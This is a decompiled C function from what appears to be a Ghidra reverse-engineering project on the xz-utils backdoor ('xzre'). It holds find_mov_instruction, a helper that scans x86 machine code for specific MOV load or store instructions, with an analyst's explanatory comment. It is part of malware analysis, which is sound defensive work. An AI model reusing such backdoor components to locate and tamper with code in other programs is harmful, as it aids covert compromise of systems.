// /home/kali/xzre-ghidra/xzregh/100E00_find_mov_instruction.c
// Function: find_mov_instruction @ 0x100E00
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_mov_instruction(u8 * code_start, u8 * code_end, BOOL is_64bit_operand, BOOL load_flag, dasm_ctx_t * dctx)


/*
 * AutoDoc: MOV-only variant of the pointer scan.
 * If `dctx` is NULL it wipes the on-stack `scratch_ctx` with the `ctx_clear_idx` / `ctx_clear_cursor` walkers and decodes into that temporary, retrying from the next byte when a decode fails.
 * Successful decodes advance by `instruction_size` and must show a memory↔register ModRM form plus opcode `0x10b` (load) or `0x109` (store) per `load_flag`; loads also require the decoded REX.W bit to match `is_64bit_operand`. On success the populated decoder is left on the MOV so pointer-tracking helpers can read the operands immediately.
 */

#include "xzre_types.h"

BOOL find_mov_instruction
               (u8 *code_start,u8 *code_end,BOOL is_64bit_operand,BOOL load_flag,dasm_ctx_t *dctx)

{
  BOOL decoded;
  long ctx_clear_idx;
  dasm_ctx_t *ctx_clear_cursor;
  BOOL is_expected_opcode;
  dasm_ctx_t scratch_ctx;
  
  ctx_clear_cursor = &scratch_ctx;
  for (ctx_clear_idx = 0x16; ctx_clear_idx != 0; ctx_clear_idx = ctx_clear_idx + -1) {
    *(undefined4 *)&ctx_clear_cursor->instruction = 0;
    ctx_clear_cursor = (dasm_ctx_t *)((long)&ctx_clear_cursor->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &scratch_ctx;
  }
  do {
    while( TRUE ) {
      if (code_end <= code_start) {
        return FALSE;
      }
      decoded = x86_dasm(dctx,code_start,code_end);
      if (decoded != FALSE) break;
      code_start = code_start + 1;
    }
    if ((((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000) &&
       (((((dctx->prefix).decoded.rex.rex_byte & 0x48) == 0x48) == is_64bit_operand ||
        (load_flag == FALSE)))) {
      if (load_flag == FALSE) {
        is_expected_opcode = *(int *)(dctx->opcode_window + 3) == 0x109;
      }
      else {
        is_expected_opcode = *(int *)(dctx->opcode_window + 3) == 0x10b;
      }
      if (is_expected_opcode) {
        return TRUE;
      }
    }
    code_start = code_start + dctx->instruction_size;
  } while( TRUE );
}

